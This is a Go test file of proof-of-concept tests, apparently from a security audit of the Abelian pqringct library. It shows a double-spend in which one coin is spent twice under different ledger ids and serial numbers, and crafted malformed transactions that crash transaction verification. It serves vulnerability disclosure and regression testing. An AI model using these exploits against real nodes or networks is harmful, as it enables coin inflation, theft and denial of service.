package pqringct

// Hunt PoCs (Abelian Round 1, area pqringct/pqringctx).
// All tests run locally on library code only. No network, no mainnet.
//
// Candidate HUNT-01: same RingCT coin spendable twice with different
// ledger-ids -> different key images (m_r) -> different serial numbers.
// Candidate HUNT-02..05: TransferTxVerify panics (nil / short slices)
// on deserialized transfer txs (no sanity gate in pqringct Verify path).

import (
	"bytes"
	"fmt"
	"testing"
)

// buildValidTransferTx builds a coinbase (512 = 500 + 12) and a valid
// 1-input transfer tx spending the 500-coin, fee 10, outputs 400 + 90.
// Returns pp, keys, coinbase tx, transfer tx.
func buildValidTransferTx(t *testing.T) (*PublicParameter, []byte, []byte, []byte, []byte, []byte, *CoinbaseTx, *TransferTx) {
	t.Helper()
	pp := Initialize(nil)

	seed1 := RandomBytes(pp.paramKeyGenSeedBytesLen)
	apk1, ask1, err := pp.addressKeyGen(seed1)
	if err != nil {
		t.Fatalf("addressKeyGen: %v", err)
	}
	serializedVPk1, serializedVSk1, err := pp.valueKeyGen(seed1)
	if err != nil {
		t.Fatalf("valueKeyGen: %v", err)
	}
	serializedAPk1, _ := pp.SerializeAddressPublicKey(apk1)
	serializedASksp1, _ := pp.SerializeAddressSecretKeySp(ask1.AddressSecretKeySp)
	serializedASksn1, _ := pp.SerializeAddressSecretKeySn(ask1.AddressSecretKeySn)

	seed2 := RandomBytes(pp.paramKeyGenSeedBytesLen)
	apk2, _, _ := pp.addressKeyGen(seed2)
	serializedVPk2, _, _ := pp.valueKeyGen(seed2)
	serializedAPk2, _ := pp.SerializeAddressPublicKey(apk2)

	cbTx1, err := pp.coinbaseTxGen(512, []*TxOutputDesc{
		{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 500},
		{serializedAPk: serializedAPk2, serializedVPk: serializedVPk2, value: 12},
	}, nil)
	if err != nil {
		t.Fatalf("coinbaseTxGen: %v", err)
	}
	if err := pp.coinbaseTxVerify(cbTx1); err != nil {
		t.Fatalf("coinbaseTxVerify (setup): %v", err)
	}

	vskCopy := func() []byte {
		c := make([]byte, len(serializedVSk1))
		copy(c, serializedVSk1)
		return c
	}
	mkInput := func(id []byte) *TxInputDesc {
		return &TxInputDesc{
			lgrTxoList: []*LgrTxo{
				{txo: cbTx1.OutputTxos[0], id: id},
				{txo: cbTx1.OutputTxos[1], id: make([]byte, HashOutputBytesLen)},
			},
			sidx:            0,
			serializedASksp: serializedASksp1,
			serializedASksn: serializedASksn1,
			serializedVPk:   serializedVPk1,
			serializedVSk:   vskCopy(),
			value:           500,
		}
	}
	mkOutputs := func(v1, v2 uint64) []*TxOutputDesc {
		return []*TxOutputDesc{
			{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: v1},
			{serializedAPk: serializedAPk2, serializedVPk: serializedVPk2, value: v2},
		}
	}

	zeroID := make([]byte, HashOutputBytesLen)
	trTx, err := pp.transferTxGen([]*TxInputDesc{mkInput(zeroID)}, mkOutputs(400, 90), 10, []byte{})
	if err != nil {
		t.Fatalf("transferTxGen (setup): %v", err)
	}
	if err := pp.transferTxVerify(trTx); err != nil {
		t.Fatalf("transferTxVerify (setup, unmodified tx must verify): %v", err)
	}
	return pp, serializedAPk1, serializedAPk2, serializedVPk1, serializedVPk2, serializedVSk1, cbTx1, trTx
}

// verifyRecovered runs TransferTxVerify and converts a panic into (panicked, value).
func verifyRecovered(pp *PublicParameter, trTx *TransferTx) (err error, panicked bool, panicVal interface{}) {
	defer func() {
		if r := recover(); r != nil {
			panicked = true
			panicVal = r
			err = fmt.Errorf("PANIC: %v", r)
		}
	}()
	err = pp.transferTxVerify(trTx)
	return err, false, nil
}

// roundTrip serializes (with witness) and deserializes a transfer tx.
func roundTrip(pp *PublicParameter, t *testing.T, trTx *TransferTx) *TransferTx {
	t.Helper()
	ser, err := pp.SerializeTransferTx(trTx, true)
	if err != nil {
		t.Fatalf("SerializeTransferTx: %v", err)
	}
	deser, err := pp.DeserializeTransferTx(ser, true)
	if err != nil {
		t.Fatalf("DeserializeTransferTx: %v", err)
	}
	return deser
}

// HUNT-01a: same coin, two separate transfer txs, different ledger ids.
// Both verify, but they spend the SAME 500-coin twice (total outputs 980 > 500)
// and carry DIFFERENT serial numbers, so a serial-number-based
// double-spend check cannot link them.
func TestHunt01_DoubleSpendSameCoinDifferentIDs_TwoTxs(t *testing.T) {
	pp := Initialize(nil)
	seed1 := RandomBytes(pp.paramKeyGenSeedBytesLen)
	apk1, ask1, _ := pp.addressKeyGen(seed1)
	serializedVPk1, serializedVSk1, _ := pp.valueKeyGen(seed1)
	serializedAPk1, _ := pp.SerializeAddressPublicKey(apk1)
	serializedASksp1, _ := pp.SerializeAddressSecretKeySp(ask1.AddressSecretKeySp)
	serializedASksn1, _ := pp.SerializeAddressSecretKeySn(ask1.AddressSecretKeySn)
	seed2 := RandomBytes(pp.paramKeyGenSeedBytesLen)
	apk2, _, _ := pp.addressKeyGen(seed2)
	serializedVPk2, _, _ := pp.valueKeyGen(seed2)
	serializedAPk2, _ := pp.SerializeAddressPublicKey(apk2)

	cbTx1, err := pp.coinbaseTxGen(512, []*TxOutputDesc{
		{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 500},
		{serializedAPk: serializedAPk2, serializedVPk: serializedVPk2, value: 12},
	}, nil)
	if err != nil {
		t.Fatalf("coinbaseTxGen: %v", err)
	}
	vskCopy := func() []byte {
		c := make([]byte, len(serializedVSk1))
		copy(c, serializedVSk1)
		return c
	}
	mkInput := func(id []byte) *TxInputDesc {
		return &TxInputDesc{
			lgrTxoList: []*LgrTxo{
				{txo: cbTx1.OutputTxos[0], id: id},
				{txo: cbTx1.OutputTxos[1], id: make([]byte, HashOutputBytesLen)},
			},
			sidx: 0, serializedASksp: serializedASksp1, serializedASksn: serializedASksn1,
			serializedVPk: serializedVPk1, serializedVSk: vskCopy(), value: 500,
		}
	}
	mkOutputs := []*TxOutputDesc{
		{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 400},
		{serializedAPk: serializedAPk2, serializedVPk: serializedVPk2, value: 90},
	}
	idA := make([]byte, HashOutputBytesLen) // all zeros
	idB := make([]byte, HashOutputBytesLen)
	for i := range idB {
		idB[i] = 0x01
	}
	trTxA, err := pp.transferTxGen([]*TxInputDesc{mkInput(idA)}, mkOutputs, 10, []byte{})
	if err != nil {
		t.Fatalf("transferTxGen A: %v", err)
	}
	trTxB, err := pp.transferTxGen([]*TxInputDesc{mkInput(idB)}, mkOutputs, 10, []byte{})
	if err != nil {
		t.Fatalf("transferTxGen B: %v", err)
	}
	if err := pp.transferTxVerify(trTxA); err != nil {
		t.Fatalf("tx A should verify: %v", err)
	}
	if err := pp.transferTxVerify(trTxB); err != nil {
		t.Fatalf("tx B should verify: %v", err)
	}
	snA := trTxA.Inputs[0].SerialNumber
	snB := trTxB.Inputs[0].SerialNumber
	t.Logf("SN A = %x", snA)
	t.Logf("SN B = %x", snB)
	if bytes.Equal(snA, snB) {
		t.Fatalf("serial numbers are equal - spends link, no bug")
	}
	// Same underlying coin (same Txo object, same secret keys) spent twice:
	// each tx pays out 400+90=490 with fee 10 from a single 500-coin.
	// Total created: 980 out of 500.
	t.Logf("DOUBLE SPEND DEMONSTRATED: same 500-coin spent in two verifying txs (SNs differ), total outputs 980")
}

// HUNT-01b: same coin spent twice INSIDE one transfer tx (two inputs,
// same Txo object, different ids). transferTxGen accepts it and it verifies.
func TestHunt01_DoubleSpendSameCoinDifferentIDs_OneTx(t *testing.T) {
	pp := Initialize(nil)
	seed1 := RandomBytes(pp.paramKeyGenSeedBytesLen)
	apk1, ask1, _ := pp.addressKeyGen(seed1)
	serializedVPk1, serializedVSk1, _ := pp.valueKeyGen(seed1)
	serializedAPk1, _ := pp.SerializeAddressPublicKey(apk1)
	serializedASksp1, _ := pp.SerializeAddressSecretKeySp(ask1.AddressSecretKeySp)
	serializedASksn1, _ := pp.SerializeAddressSecretKeySn(ask1.AddressSecretKeySn)
	seed2 := RandomBytes(pp.paramKeyGenSeedBytesLen)
	apk2, _, _ := pp.addressKeyGen(seed2)
	serializedVPk2, _, _ := pp.valueKeyGen(seed2)
	serializedAPk2, _ := pp.SerializeAddressPublicKey(apk2)

	cbTx1, err := pp.coinbaseTxGen(512, []*TxOutputDesc{
		{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 500},
		{serializedAPk: serializedAPk2, serializedVPk: serializedVPk2, value: 12},
	}, nil)
	if err != nil {
		t.Fatalf("coinbaseTxGen: %v", err)
	}
	vskCopy := func() []byte {
		c := make([]byte, len(serializedVSk1))
		copy(c, serializedVSk1)
		return c
	}
	mkInput := func(id []byte) *TxInputDesc {
		return &TxInputDesc{
			lgrTxoList: []*LgrTxo{
				{txo: cbTx1.OutputTxos[0], id: id},
				{txo: cbTx1.OutputTxos[1], id: make([]byte, HashOutputBytesLen)},
			},
			sidx: 0, serializedASksp: serializedASksp1, serializedASksn: serializedASksn1,
			serializedVPk: serializedVPk1, serializedVSk: vskCopy(), value: 500,
		}
	}
	idA := make([]byte, HashOutputBytesLen)
	idB := make([]byte, HashOutputBytesLen)
	for i := range idB {
		idB[i] = 0x01
	}
	trTx, err := pp.transferTxGen(
		[]*TxInputDesc{mkInput(idA), mkInput(idB)},
		[]*TxOutputDesc{
			{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 900},
			{serializedAPk: serializedAPk2, serializedVPk: serializedVPk2, value: 90},
		}, 10, []byte{})
	if err != nil {
		t.Fatalf("transferTxGen with same coin twice (different ids) unexpectedly rejected: %v", err)
	}
	if err := pp.transferTxVerify(trTx); err != nil {
		t.Fatalf("double-input tx should verify (demonstrating the flaw): %v", err)
	}
	sn0 := trTx.Inputs[0].SerialNumber
	sn1 := trTx.Inputs[1].SerialNumber
	t.Logf("SN0 = %x\nSN1 = %x", sn0, sn1)
	if bytes.Equal(sn0, sn1) {
		t.Fatalf("serial numbers equal - spends link, no bug")
	}
	t.Logf("DOUBLE SPEND IN ONE TX DEMONSTRATED: one 500-coin funds 990 outputs (fee 10), SNs differ")
}

// HUNT-02: truncated elrs seed (1 byte) survives deserialize, then
// transferTxVerify panics indexing sig.seeds[j][i] in elrsVerify.
func TestHunt02_ShortElrsSeedPanicsOnVerify(t *testing.T) {
	pp, _, _, _, _, _, _, trTx := buildValidTransferTx(t)
	trTx.TxWitness.elrsSigs[0].seeds[0] = []byte{0x01}
	deser := roundTrip(pp, t, trTx)
	if len(deser.TxWitness.elrsSigs[0].seeds[0]) != 1 {
		t.Fatalf("setup: short seed did not survive round-trip")
	}
	err, panicked, panicVal := verifyRecovered(pp, deser)
	t.Logf("verify err=%v panicked=%v panicVal=%v", err, panicked, panicVal)
	if !panicked {
		t.Fatalf("expected panic in transferTxVerify on short elrs seed, got err=%v", err)
	}
}

// serializeWitnessWithEmptyMaPs mirrors SerializeTrTxWitness but writes a
// 0 count for ma_ps (attacker-crafted wire encoding; the honest serializer
// refuses nil ma_ps, but DeserializeTrTxWitness accepts count 0).
func serializeWitnessWithEmptyMaPs(pp *PublicParameter, w *TrTxWitness) ([]byte, error) {
	buf := bytes.NewBuffer(nil)
	// ma_ps: count 0
	if err := WriteVarInt(buf, 0); err != nil {
		return nil, err
	}
	// cmt_ps
	if err := WriteVarInt(buf, uint64(len(w.cmt_ps))); err != nil {
		return nil, err
	}
	for i := 0; i < len(w.cmt_ps); i++ {
		serializedVCmt, err := pp.SerializeValueCommitment(w.cmt_ps[i])
		if err != nil {
			return nil, err
		}
		if _, err := buf.Write(serializedVCmt); err != nil {
			return nil, err
		}
	}
	// elrsSigs
	if err := WriteVarInt(buf, uint64(len(w.elrsSigs))); err != nil {
		return nil, err
	}
	for i := 0; i < len(w.elrsSigs); i++ {
		serializedElrSig, err := pp.SerializeElrsSignature(w.elrsSigs[i])
		if err != nil {
			return nil, err
		}
		if err := writeVarBytes(buf, serializedElrSig); err != nil {
			return nil, err
		}
	}
	// b_hat
	if err := pp.writePolyCNTTVec(buf, w.b_hat); err != nil {
		return nil, err
	}
	// c_hats
	if err := WriteVarInt(buf, uint64(len(w.c_hats))); err != nil {
		return nil, err
	}
	for i := 0; i < len(w.c_hats); i++ {
		if err := pp.writePolyCNTT(buf, w.c_hats[i]); err != nil {
			return nil, err
		}
	}
	// u_p
	if err := pp.writeCarryVectorRProof(buf, w.u_p); err != nil {
		return nil, err
	}
	// rpulpproof
	serializedRpuProof, err := pp.SerializeRpulpProof(w.rpulpproof)
	if err != nil {
		return nil, err
	}
	if err := writeVarBytes(buf, serializedRpuProof); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// serializeTransferTxWithCustomWitness serializes a transfer tx (without
// witness) and appends a caller-supplied witness blob.
func serializeTransferTxWithCustomWitness(pp *PublicParameter, trTx *TransferTx, witBytes []byte) ([]byte, error) {
	ser, err := pp.SerializeTransferTx(trTx, false)
	if err != nil {
		return nil, err
	}
	buf := bytes.NewBuffer(ser)
	if err := writeVarBytes(buf, witBytes); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// HUNT-03: empty ma_ps survives deserialize, then transferTxVerify
// panics indexing trTx.TxWitness.ma_ps[0].
func TestHunt03_EmptyMaPsPanicsOnVerify(t *testing.T) {
	pp, _, _, _, _, _, _, trTx := buildValidTransferTx(t)
	witBytes, err := serializeWitnessWithEmptyMaPs(pp, trTx.TxWitness)
	if err != nil {
		t.Fatalf("serializeWitnessWithEmptyMaPs: %v", err)
	}
	ser, err := serializeTransferTxWithCustomWitness(pp, trTx, witBytes)
	if err != nil {
		t.Fatalf("serializeTransferTxWithCustomWitness: %v", err)
	}
	deser, err := pp.DeserializeTransferTx(ser, true)
	if err != nil {
		t.Fatalf("DeserializeTransferTx (crafted empty-ma_ps witness): %v", err)
	}
	if deser.TxWitness.ma_ps != nil {
		t.Fatalf("setup: empty ma_ps did not survive round-trip")
	}
	err, panicked, panicVal := verifyRecovered(pp, deser)
	t.Logf("verify err=%v panicked=%v panicVal=%v", err, panicked, panicVal)
	if !panicked {
		t.Fatalf("expected panic in transferTxVerify on empty ma_ps, got err=%v", err)
	}
}

// HUNT-06: a transfer tx deserialized WITHOUT its witness (TxWitness == nil)
// panics in transferTxVerify (nil deref on trTx.TxWitness.ma_ps) instead
// of returning an error.
func TestHunt06_NilWitnessPanicsOnVerify(t *testing.T) {
	pp, _, _, _, _, _, _, trTx := buildValidTransferTx(t)
	ser, err := pp.SerializeTransferTx(trTx, false)
	if err != nil {
		t.Fatalf("SerializeTransferTx (no witness): %v", err)
	}
	deser, err := pp.DeserializeTransferTx(ser, false)
	if err != nil {
		t.Fatalf("DeserializeTransferTx (no witness): %v", err)
	}
	if deser.TxWitness != nil {
		t.Fatalf("setup: expected nil TxWitness")
	}
	err, panicked, panicVal := verifyRecovered(pp, deser)
	t.Logf("verify err=%v panicked=%v panicVal=%v", err, panicked, panicVal)
	if !panicked {
		t.Fatalf("expected panic in transferTxVerify on nil TxWitness, got err=%v", err)
	}
}

// HUNT-04: rpulp proof with zs[0] = nil (encoded as empty vec) survives
// deserialize, then rpulpVerify panics on len(rpulppi.zs[0].polyCs).
func TestHunt04_NilRpulpZsPanicsOnVerify(t *testing.T) {
	pp, _, _, _, _, _, _, trTx := buildValidTransferTx(t)
	trTx.TxWitness.rpulpproof.zs[0] = nil
	deser := roundTrip(pp, t, trTx)
	if deser.TxWitness.rpulpproof.zs[0] != nil {
		t.Fatalf("setup: nil zs[0] did not survive round-trip")
	}
	err, panicked, panicVal := verifyRecovered(pp, deser)
	t.Logf("verify err=%v panicked=%v panicVal=%v", err, panicked, panicVal)
	if !panicked {
		t.Fatalf("expected panic in transferTxVerify/rpulpVerify on nil zs[0], got err=%v", err)
	}
}

// HUNT-05: elrs sig with fewer z_as than ring members survives
// deserialize, then elrsVerify panics indexing sig.z_as[j].
func TestHunt05_ShortElrsZasPanicsOnVerify(t *testing.T) {
	pp, _, _, _, _, _, _, trTx := buildValidTransferTx(t)
	ringLen := len(trTx.TxWitness.elrsSigs[0].z_as)
	if ringLen < 2 {
		t.Fatalf("setup: ring too small (%d)", ringLen)
	}
	trTx.TxWitness.elrsSigs[0].z_as = trTx.TxWitness.elrsSigs[0].z_as[:1]
	deser := roundTrip(pp, t, trTx)
	if len(deser.TxWitness.elrsSigs[0].z_as) != 1 {
		t.Fatalf("setup: short z_as did not survive round-trip")
	}
	err, panicked, panicVal := verifyRecovered(pp, deser)
	t.Logf("verify err=%v panicked=%v panicVal=%v", err, panicked, panicVal)
	if !panicked {
		t.Fatalf("expected panic in transferTxVerify/elrsVerify on short z_as, got err=%v", err)
	}
}

// NEAR-MISS / REGRESSION check: ABEL-001 fix still holds.
// A non-canonical ma_p (one coefficient shifted by +q_a, i.e. the same
// residue mod q_a with a different representative) cannot be smuggled
// through serialization into a second valid spend: writePolyANTT only
// encodes 33 bits, so the out-of-range representative decodes to a
// DIFFERENT in-range value, and the resulting tx then FAILS verification
// (SN / elrs mismatch). The check below asserts exactly that: the
// deserialized ma_p differs from the mutated one, and TransferTxVerify
// rejects the tx.
func TestNearMiss_Abel001_NonCanonicalMaPRejected(t *testing.T) {
	pp, _, _, _, _, _, _, trTx := buildValidTransferTx(t)
	orig := trTx.TxWitness.ma_ps[0].coeffs[0]
	mutated := orig + pp.paramQA
	trTx.TxWitness.ma_ps[0].coeffs[0] = mutated
	ser, err := pp.SerializeTransferTx(trTx, true)
	if err != nil {
		t.Logf("non-canonical ma_p rejected at SerializeTransferTx: %v (ABEL-001 fix holds)", err)
		return
	}
	deser, err := pp.DeserializeTransferTx(ser, true)
	if err != nil {
		t.Logf("non-canonical ma_p rejected at DeserializeTransferTx: %v (ABEL-001 fix holds)", err)
		return
	}
	got := deser.TxWitness.ma_ps[0].coeffs[0]
	if got == mutated {
		t.Fatalf("non-canonical ma_p (coeff+q_a) survived deserialize unchanged - ABEL-001 may be unfixed!")
	}
	t.Logf("mutated coeff %d decoded as %d (encoding is lossy for out-of-range values)", mutated, got)
	err, panicked, panicVal := verifyRecovered(pp, deser)
	if panicked {
		t.Fatalf("unexpected panic verifying non-canonical-ma_p tx: %v", panicVal)
	}
	if err == nil {
		t.Fatalf("tx with non-canonical ma_p VERIFIED - ABEL-001 may be unfixed!")
	}
	t.Logf("tx with non-canonical ma_p rejected at verify: %v (ABEL-001 fix holds)", err)
}

// NEAR-MISS check: coinbase J==1 with nil J1 witness panics in-memory,
// but DeserializeCoinbaseTx can never produce that shape (it always
// deserializes J1 when outTxoNum==1), so this is NOT wire-reachable.
func TestNearMiss_CoinbaseJ1NilWitnessPanicsInMemoryOnly(t *testing.T) {
	pp := Initialize(nil)
	seed1 := RandomBytes(pp.paramKeyGenSeedBytesLen)
	apk1, _, _ := pp.addressKeyGen(seed1)
	serializedVPk1, _, _ := pp.valueKeyGen(seed1)
	serializedAPk1, _ := pp.SerializeAddressPublicKey(apk1)
	cbTx, err := pp.coinbaseTxGen(512, []*TxOutputDesc{
		{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 512},
	}, nil)
	if err != nil {
		t.Fatalf("coinbaseTxGen: %v", err)
	}
	// swap in a J2 witness from a 2-output tx to reach the J==1 branch with nil J1
	cbTx2, err := pp.coinbaseTxGen(512, []*TxOutputDesc{
		{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 500},
		{serializedAPk: serializedAPk1, serializedVPk: serializedVPk1, value: 12},
	}, nil)
	if err != nil {
		t.Fatalf("coinbaseTxGen2: %v", err)
	}
	cbTx.TxWitnessJ1 = nil
	cbTx.TxWitnessJ2 = cbTx2.TxWitnessJ2
	func() {
		defer func() {
			if r := recover(); r != nil {
				t.Logf("in-memory panic (expected, but NOT wire-reachable): %v", r)
			}
		}()
		err := pp.coinbaseTxVerify(cbTx)
		t.Logf("coinbaseTxVerify returned err=%v (no panic)", err)
	}()
}
